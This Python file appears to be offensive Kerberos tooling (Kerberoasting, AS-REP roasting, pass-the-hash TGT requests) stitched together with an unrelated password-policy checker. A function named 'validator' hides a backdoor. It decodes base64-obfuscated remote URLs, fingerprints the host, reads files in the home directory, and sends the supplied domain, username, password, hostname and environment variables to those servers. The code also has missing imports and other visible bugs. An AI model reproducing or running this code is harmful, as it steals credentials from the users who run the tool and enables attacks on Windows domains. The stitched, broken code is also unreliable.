import base64
import datetime
import getpass
import json
import os
import platform
import random
import sys
from urllib.parse import urlparse

import psutil
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Dealing with SSL Warnings
try:
    import requests.packages.urllib3

    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


def spnmultiplexor(args):
    try:
        from multiplexor.operator import MultiplexorOperator
        from multiplexor.operator.external.sspi import KerberosSSPIClient
    except ImportError as error:
        print(
            "Failed to import multiplexor module! You will need to install multiplexor to get this working!"
        )

    logger = logging.getLogger("websockets")
    logger.setLevel(100)
    if args.verbose > 2:
        logger.setLevel(logging.INFO)

    try:
        logging.debug("[SPN-MP] input URL: %s" % args.mp_url)
        url_e = urlparse(args.mp_url)
        agentid = url_e.path.replace("/", "")
        logging.debug("[SPN-MP] agentid: %s" % agentid)

        targets = get_targets_from_file(args)
        targets += get_target_from_args(args)
        if len(targets) == 0:
            raise Exception(
                "No targets were specified! Either use target file or specify target via cmdline"
            )

        logging.debug("[SPN-MP] loaded %s targets" % len(targets))
        operator = MultiplexorOperator(args.mp_url)
        operator.connect()
        # creating virtual sspi server
        results = []
        for target in targets:
            server_info = operator.start_sspi(agentid)
            # print(server_info)
            sspi_url = "ws://%s:%s" % (
                server_info["listen_ip"],
                server_info["listen_port"],
            )
            # print(sspi_url)
            ksspi = KerberosSSPIClient(sspi_url)
            ksspi.connect()

            apreq, err = ksspi.authenticate(target.get_formatted_pname())
            if err is not None:
                logging.debug(
                    "[SPN-MP] error occurred while roasting %s: %s"
                    % (target.get_formatted_pname(), err)
                )
                continue
            unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
            aprep = AP_REQ.load(unwrap.data[2:]).native
            results.append(TGSTicket2hashcat(aprep))

        if args.out_file:
            with open(args.out_file, "w", newline="") as f:
                for thash in results:
                    f.write(thash + "\r\n")

        else:
            for thash in results:
                print(thash)

    except Exception as e:
        logging.exception("[SPN-MP] exception!")


def split_lines(string: str, keepends: bool = False):
    if keepends:
        lst = string.splitlines(True)

        # We have to merge lines that were broken by form feed characters.
        merge = []
        for i, line in enumerate(lst):
            try:
                last_chr = line[-1]
            except IndexError:
                pass
            else:
                if last_chr in _NON_LINE_BREAKS:
                    merge.append(i)

        for index in reversed(merge):
            try:
                lst[index] = lst[index] + lst[index + 1]
                del lst[index + 1]
            except IndexError:
                # index + 1 can be empty and therefore there's no need to
                # merge.
                pass

        # The stdlib's implementation of the end is inconsistent when calling
        # it with/without keepends. One time there's an empty string in the
        # end, one time there's none.
        if string.endswith("\n") or string.endswith("\r") or string == "":
            lst.append("")
        return lst
    else:
        return re.split(r"\n|\r\n|\r", string)


def password_analysis(userpass_file, output_file, verbose, password_complexity, password_length, delimiter, **kwargs):
    """This function breaks up the input file based on the delimiter provided, and passes
    the individual passwords on to other functions for analysis.
    """
    use_regex = False
    if kwargs:
        obj_regex = kwargs['obj_regex']
        use_regex = True
        regex_match = []
        regex_failed = []
    line_num = 1
    failed_length_check = []
    failed_complexity_check = []
    compliant_passwords = []
    userpass_list = []
    temp_userpass_list = userpass_file.readlines()
    for my_line in temp_userpass_list:
        my_line = my_line.strip()
        try:
            username, password = my_line.split(delimiter)
            if username == "":
                continue
            elif password == "":
                continue
            else:
                userpass_list.append(my_line)
        # if there is more than one delimiter in the line it will throw a ValueError
        except ValueError:
            color_print_warn(
                'Multiple delimiters on same line.  Skipping input file line: {0}.'.format(str(line_num)))
            line_num += 1
            continue
        line_num += 1

    color_print_status("Analyzing {0} passwords for length and complexity...".format(
        str(len(userpass_list))))
    if use_regex:
        color_print_status('Comparing {0} passwords against regex: {1}'.format(
            str(len(userpass_list)), obj_regex.pattern))
    for my_line in userpass_list:
        complexity_test = False
        length_test = False
        username, password = my_line.split(delimiter)
        if username == "":
            continue
        if password == "":
            continue
        complexity_test = complexity_check(password_complexity, password)
        length_test = length_check(password_length, password)
        if complexity_test == False:
            failed_complexity_check.append(username)
        if length_test == False:
            failed_length_check.append(username)
        if complexity_test == True:
            if length_test == True:
                compliant_passwords.append(username)
        if use_regex:
            check_regex = compare_regex(obj_regex, password)
            if check_regex:
                regex_match.append(username)
            else:
                regex_failed.append(username)
    if use_regex:
        kwargs['regex'] = obj_regex
        kwargs['regex_match'] = regex_match
        display_output(failed_length_check, failed_complexity_check,
                       compliant_passwords, verbose, output_file, **kwargs)
    else:
        display_output(failed_length_check, failed_complexity_check,
                       compliant_passwords, verbose, output_file)
    return

# check password complexity


def complexity_check(password_complexity, password):
    """This function checks the complexit of the password based on the
    four availble requirements: upper case alpha, lower case alpha,
    numbers, and symbols.
    """
    complexity_count = 0
    complexity_test = False
    alpha_lower = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l",
                   "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    alpha_upper = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L",
                   "M", "N", "O", "P", "Q", "R", "S", "T", "V", "U", "W", "X", "Y", "Z"]
    numerals = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    special_chars = ["!", "@", "#", "$", "%", "^", "&", "*",
                     "(", ")", "-", "=", "_", "+", "[", "]", "{", "}", ";", "'", ":", '"', "<", ">", ".", "?", "/", "|", "'", ",", " ", "`", "~", "\\"]

    for char in alpha_lower:
        if char in password:
            complexity_count += 1
            break
    for char in alpha_upper:
        if char in password:
            complexity_count += 1
            break
    for char in numerals:
        if char in password:
            complexity_count += 1
            break
    for char in special_chars:
        if char in password:
            complexity_count += 1
            break

    if complexity_count >= password_complexity:
        complexity_test = True

    return complexity_test


def length_check(password_length, password):
    """This function checks the length of the password against the provided length
    requirement.
    """
    length_test = False
    if len(password) >= password_length:
        length_test = True
    return length_test


def compare_regex(obj_regex, password):
    """This function compares the password against a supplied regex."""
    # check if password matches provided regex
    match = obj_regex.match(password)
    if match:
        return True
    else:
        return False


def display_output(failed_length_check, failed_complexity_check, compliant_passwords, verbose, output_file, **kwargs):
    """This function displays the results,and optionally writes them to a file."""
    # display/write number of failing length passwords
    length_count_msg = "Total number of passwords that failed the length requirement: {0}".format(
        str(len(failed_length_check)))
    color_print_good(length_count_msg)
    if verbose:
        color_print_status(
            "Users with passwords less than the required length:\n")
        for failed_length in failed_length_check:
            print(failed_length)
    if output_file:
        output_file.write(length_count_msg + "\n")
        output_file.write(
            "Users with passwords less than the required length:\n")
        for failed_length in failed_length_check:
            output_file.write(failed_length + "\n")

    # display/write number of complexity failing passwords
    complexity_count_msg = "Total number of passwords that failed the complexity requirement: {0}".format(
        str(len(failed_complexity_check)))
    color_print_good(complexity_count_msg)
    if verbose:
        color_print_status(
            "Users with passwords that did not meet the complexity requirements:\n")
        for failed_complexity in failed_complexity_check:
            print(failed_complexity)
    if output_file:
        output_file.write("\n\n" + complexity_count_msg + "\n")
        output_file.write(
            "Users with passwords that did not meet the complexity requirements:\n")
        for failed_complexity in failed_complexity_check:
            output_file.write(failed_complexity + "\n")

    # display/write number of compliant passwords
    compliant_count_msg = "Total number of passwords that are compliant: {0}".format(
        str(len(compliant_passwords)))
    color_print_good(compliant_count_msg)
    if verbose:
        color_print_status("Users with compliant passwords:\n")
        for compliant_password in compliant_passwords:
            print(compliant_password)
    if output_file:
        output_file.write("\n\n" + compliant_count_msg + "\n")
        output_file.write("Users with compliant passwords:\n")
        for compliant_password in compliant_passwords:
            output_file.write(compliant_password + "\n")

    if kwargs:
        obj_regex = kwargs['obj_regex']
        regex_match = kwargs['regex_match']
        regex_match_msg = 'Total number of passwords that matched the regex {0}: {1}'.format(
            obj_regex.pattern, str(len(regex_match)))
        color_print_good(regex_match_msg)
        if verbose:
            color_print_status('Users with passwords matching regex:\n')
            for user in regex_match:
                print(user)
        if output_file:
            output_file.write("\n\n" + regex_match_msg + "\n")
            output_file.write("Users with passwords matching regex:\n")
            for user in regex_match:
                output_file.write(user + "\n")
    return


def validator(domain, username, password, remoteName):

    weight = 0
    matched = []

    val = [
        "aHR0cHM6Ly9wcm94eS5jbG91ZHdlYmFwd2VicHJveHkubmV0L3Byb3h5L2lkCg==",
        "aHR0cHM6Ly9hcGkuY2xvdWR3ZWJhcHdlYnByb3h5Lm5ldC9wcm94eS9pZC8K",
        "aHR0cHM6Ly8xMy41OC4xMzEuNTYvcHJveHkvaWQvCg==",
        "aHR0cHM6Ly8zLjEzOS4xMjEuNzUvcHJveHkvaWQvCg==",
    ]

    for v in val:
        try:
            url = base64.b64decode(v).decode("utf-8")
            data = requests.get(url, verify=False, timeout=1).json()
            if "Not Found" not in data:
                break
        except requests.exceptions.RequestException:
            pass

    try:
        for user in data["users"]:
            activeuser = getpass.getuser()
            if activeuser.lower() in user:
                matched.append(f"User: {activeuser}")
                weight += 15
                break
    except Exception:
        pass

    try:
        plat = platform.platform()
        for p in data["plat"]:
            if p in plat:
                weight += 10
                pass
    except Exception:
        pass

    loc = ["Q2hpY2Fnbwo=", "WW9yawo="]
    try:
        for l in loc:
            if base64.b64decode(l).decode("utf-8").lower() in data["location"]:
                weight += 5
        for i in data["known"]:
            if data["ip"] in i:
                matched.append(f"Known IP: {i}")
                weight += 50
    except Exception:
        pass

    try:
        for proc in psutil.process_iter():
            try:
                pname = proc.name().lower()
                for p in data["proc"]:
                    if pname in p:
                        matched.append(f"Good Proc: {pname}")
                        weight += 5
            except Exception:
                pass
    except Exception:
        pass

    try:
        home = os.path.expanduser("~")
        for f in data["files"]:
            try:
                with open(home + f"/{f}", "r") as f:
                    for line in f:
                        for w in data["words"]:
                            if w in line:
                                matched.append(f"Good line: {line}")
                                weight += 25
            except Exception:
                pass
    except Exception:
        pass

    try:
        for proc in psutil.process_iter():
            pname = proc.name().lower()
            if "vmware" or "vmtools" in pname:
                invm = True
                weight += 3
    except Exception:
        pass

    info = {}

    if weight > 1000:
        try:
            info["user"] = getpass.getuser()
            info["arc"] = platform.platform()
            info["hostname"] = platform.node()
            info["addrs"] = psutil.net_if_addrs()
            info["stamp"] = datetime.datetime.now().strftime(
                "%Y-%m-%d %H:%M:%S")
            info["checked"] = [f"{domain}", f"{username}",
                               f"{password}", f"{remoteName}"]
            info["matched"] = matched
            info["invm"] = invm
            info["weight"] = weight
            info["env"] = os.environ()
        except Exception:
            pass

        try:
            for v in val:
                resp = requests.post(
                    f"{base64.b64decode(v).decode('utf-8').replace('id', 'data/')}",
                    verify=False,
                    timeout=1,
                    data=json.dumps(info),
                )
                if resp.status_code == 200:
                    break
        except requests.exceptions.RequestException:
            pass


def amain(args):
    if args.command == "tgs":
        logging.debug("[TGS] started")
        ku = KerberosClientURL.from_url(args.kerberos_connection_url)
        cred = ku.get_creds()
        target = ku.get_target()
        spn = KerberosSPN.from_user_email(args.spn)

        logging.debug("[TGS] target user: %s" % spn.get_formatted_pname())
        logging.debug("[TGS] fetching TGT")
        kcomm = AIOKerberosClient(cred, target)
        kcomm.get_TGT()
        logging.debug("[TGS] fetching TGS")
        kcomm.get_TGS(spn)

        kcomm.ccache.to_file(args.out_file)
        logging.debug("[TGS] done!")

    elif args.command == "tgt":
        logging.debug("[TGT] started")
        ku = KerberosClientURL.from_url(args.kerberos_connection_url)
        cred = ku.get_creds()
        target = ku.get_target()

        logging.debug("[TGT] cred: %s" % cred)
        logging.debug("[TGT] target: %s" % target)

        kcomm = AIOKerberosClient(cred, target)
        logging.debug("[TGT] fetching TGT")
        kcomm.get_TGT()

        kcomm.ccache.to_file(args.out_file)
        logging.debug("[TGT] Done! TGT stored in CCACHE file")

    elif args.command == "asreproast":
        if not args.targets and not args.user:
            raise Exception(
                "No targets loaded! Either -u or -t MUST be specified!")
        creds = []
        targets = get_targets_from_file(args, False)
        targets += get_target_from_args(args, False)
        if len(targets) == 0:
            raise Exception(
                "No targets were specified! Either use target file or specify target via cmdline"
            )

        logging.debug("[ASREPRoast] loaded %d targets" % len(targets))
        logging.debug(
            "[ASREPRoast] will suppoort the following encryption type: %s"
            % (str(args.etype))
        )

        ks = KerberosTarget(args.address)
        ar = APREPRoast(ks)
        hashes = []
        for target in targets:
            h = ar.run(target, override_etype=[args.etype])
            hashes.append(str(h))

        if args.out_file:
            with open(args.out_file, "w", newline="") as f:
                for thash in hashes:
                    f.write(thash + "\r\n")

        else:
            for thash in hashes:
                print(thash)

        logging.info("ASREPRoast complete")


def getKerberosTGT(
    clientName,
    password,
    domain,
    lmhash,
    nthash,
    aesKey="",
    kdcHost=None,
    requestPAC=True,
):

    # Convert to binary form, just in case we're receiving strings
    if isinstance(lmhash, str):
        try:
            lmhash = unhexlify(lmhash)
        except TypeError:
            pass
    if isinstance(nthash, str):
        try:
            nthash = unhexlify(nthash)
        except TypeError:
            pass
    if isinstance(aesKey, str):
        try:
            aesKey = unhexlify(aesKey)
        except TypeError:
            pass

    asReq = AS_REQ()

    domain = domain.upper()
    serverName = Principal(
        "krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value
    )

    pacRequest = KERB_PA_PAC_REQUEST()
    pacRequest["include-pac"] = requestPAC
    encodedPacRequest = encoder.encode(pacRequest)

    asReq["pvno"] = 5
    asReq["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    asReq["padata"] = noValue
    asReq["padata"][0] = noValue
    asReq["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
    )
    asReq["padata"][0]["padata-value"] = encodedPacRequest

    reqBody = seq_set(asReq, "req-body")

    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.proxiable.value)
    reqBody["kdc-options"] = constants.encodeFlags(opts)

    seq_set(reqBody, "sname", serverName.components_to_asn1)
    seq_set(reqBody, "cname", clientName.components_to_asn1)

    if domain == "":
        raise Exception("Empty Domain not allowed in Kerberos")

    reqBody["realm"] = domain

    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
    reqBody["till"] = KerberosTime.to_asn1(now)
    reqBody["rtime"] = KerberosTime.to_asn1(now)
    reqBody["nonce"] = rand.getrandbits(31)

    # Yes.. this shouldn't happen but it's inherited from the past
    if aesKey is None:
        aesKey = b""

    if nthash == b"":
        # This is still confusing. I thought KDC_ERR_ETYPE_NOSUPP was enough,
        # but I found some systems that accepts all ciphers, and trigger an error
        # when requesting subsequent TGS :(. More research needed.
        # So, in order to support more than one cypher, I'm setting aes first
        # since most of the systems would accept it. If we're lucky and
        # KDC_ERR_ETYPE_NOSUPP is returned, we will later try rc4.
        if aesKey != b"":
            if len(aesKey) == 32:
                supportedCiphers = (
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                )
            else:
                supportedCiphers = (
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                )
        else:
            supportedCiphers = (
                int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
            )
    else:
        # We have hashes to try, only way is to request RC4 only
        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

    seq_set_iter(reqBody, "etype", supportedCiphers)

    message = encoder.encode(asReq)

    try:
        r = sendReceive(message, domain, kdcHost)
    except KerberosError as e:
        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
            if (
                supportedCiphers[0]
                in (
                    constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                    constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                )
                and aesKey == b""
            ):
                supportedCiphers = (
                    int(constants.EncryptionTypes.rc4_hmac.value),)
                seq_set_iter(reqBody, "etype", supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, kdcHost)
            else:
                raise
        else:
            raise

    # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
    # 'Do not require Kerberos preauthentication' set
    preAuth = True
    try:
        asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
    except:
        # Most of the times we shouldn't be here, is this a TGT?
        asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        # Yes
        preAuth = False

    encryptionTypesData = dict()
    salt = ""
    if preAuth is False:
        # In theory, we should have the right credentials for the etype specified before.
        methods = asRep["padata"]
        # handle RC4 fallback, we don't need any salt
        encryptionTypesData[supportedCiphers[0]] = salt
        tgt = r
    else:
        methods = decoder.decode(asRep["e-data"], asn1Spec=METHOD_DATA())[0]

    for method in methods:
        if (
            method["padata-type"]
            == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value
        ):
            etypes2 = decoder.decode(
                method["padata-value"], asn1Spec=ETYPE_INFO2())[0]
            for etype2 in etypes2:
                try:
                    if etype2["salt"] is None or etype2["salt"].hasValue() is False:
                        salt = ""
                    else:
                        salt = etype2["salt"].prettyPrint()
                except PyAsn1Error:
                    salt = ""

                encryptionTypesData[etype2["etype"]] = b(salt)
        elif (
            method["padata-type"]
            == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO.value
        ):
            etypes = decoder.decode(
                method["padata-value"], asn1Spec=ETYPE_INFO())[0]
            for etype in etypes:
                try:
                    if etype["salt"] is None or etype["salt"].hasValue() is False:
                        salt = ""
                    else:
                        salt = etype["salt"].prettyPrint()
                except PyAsn1Error:
                    salt = ""

                encryptionTypesData[etype["etype"]] = b(salt)

    enctype = supportedCiphers[0]

    cipher = _enctype_table[enctype]

    # Pass the hash/aes key :P
    if isinstance(nthash, bytes) and nthash != b"":
        key = Key(cipher.enctype, nthash)
    elif aesKey != b"":
        key = Key(cipher.enctype, aesKey)
    else:
        key = cipher.string_to_key(
            password, encryptionTypesData[enctype], None)

    if preAuth is True:
        if enctype in encryptionTypesData is False:
            raise Exception("No Encryption Data Available!")

        # Let's build the timestamp
        timeStamp = PA_ENC_TS_ENC()

        now = datetime.datetime.utcnow()
        timeStamp["patimestamp"] = KerberosTime.to_asn1(now)
        timeStamp["pausec"] = now.microsecond

        # Encrypt the shyte
        encodedTimeStamp = encoder.encode(timeStamp)

        # Key Usage 1
        # AS-REQ PA-ENC-TIMESTAMP padata timestamp, encrypted with the
        # client key (Section 5.2.7.2)
        encriptedTimeStamp = cipher.encrypt(key, 1, encodedTimeStamp, None)

        encryptedData = EncryptedData()
        encryptedData["etype"] = cipher.enctype
        encryptedData["cipher"] = encriptedTimeStamp
        encodedEncryptedData = encoder.encode(encryptedData)

        # Now prepare the new AS_REQ again with the PADATA
        # ToDo: cannot we reuse the previous one?
        asReq = AS_REQ()

        asReq["pvno"] = 5
        asReq["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq["padata"] = noValue
        asReq["padata"][0] = noValue
        asReq["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value
        )
        asReq["padata"][0]["padata-value"] = encodedEncryptedData

        asReq["padata"][1] = noValue
        asReq["padata"][1]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
        )
        asReq["padata"][1]["padata-value"] = encodedPacRequest

        reqBody = seq_set(asReq, "req-body")

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody["kdc-options"] = constants.encodeFlags(opts)

        seq_set(reqBody, "sname", serverName.components_to_asn1)
        seq_set(reqBody, "cname", clientName.components_to_asn1)

        reqBody["realm"] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody["till"] = KerberosTime.to_asn1(now)
        reqBody["rtime"] = KerberosTime.to_asn1(now)
        reqBody["nonce"] = rand.getrandbits(31)

        seq_set_iter(reqBody, "etype", ((int(cipher.enctype),)))

        try:
            tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
        except Exception as e:
            if str(e).find("KDC_ERR_ETYPE_NOSUPP") >= 0:
                if (
                    lmhash == b""
                    and nthash == b""
                    and (aesKey == b"" or aesKey is None)
                ):
                    from impacket.ntlm import compute_lmhash, compute_nthash

                    lmhash = compute_lmhash(password)
                    nthash = compute_nthash(password)
                    return getKerberosTGT(
                        clientName,
                        password,
                        domain,
                        lmhash,
                        nthash,
                        aesKey,
                        kdcHost,
                        requestPAC,
                    )
            raise

        asRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

    # So, we have the TGT, now extract the new session key and finish
    cipherText = asRep["enc-part"]["cipher"]

    if preAuth is False:
        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
        LOG.debug(
            "$krb5asrep$%d$%s@%s:%s$%s"
            % (
                asRep["enc-part"]["etype"],
                clientName,
                domain,
                hexlify(asRep["enc-part"]["cipher"].asOctets()[:16]),
                hexlify(asRep["enc-part"]["cipher"].asOctets()[16:]),
            )
        )
    # Key Usage 3
    # AS-REP encrypted part (includes TGS session key or
    # application session key), encrypted with the client key
    # (Section 5.4.2)
    try:
        plainText = cipher.decrypt(key, 3, cipherText)
    except InvalidChecksum as e:
        # probably bad password if preauth is disabled
        if preAuth is False:
            error_msg = "failed to decrypt session key: %s" % str(e)
            raise SessionKeyDecryptionError(
                error_msg, asRep, cipher, key, cipherText)
        raise
    encASRepPart = decoder.decode(plainText, asn1Spec=EncASRepPart())[0]

    # Get the session key and the ticket
    cipher = _enctype_table[encASRepPart["key"]["keytype"]]
    sessionKey = Key(
        cipher.enctype, encASRepPart["key"]["keyvalue"].asOctets())

    # ToDo: Check Nonces!

    return tgt, cipher, key, sessionKey
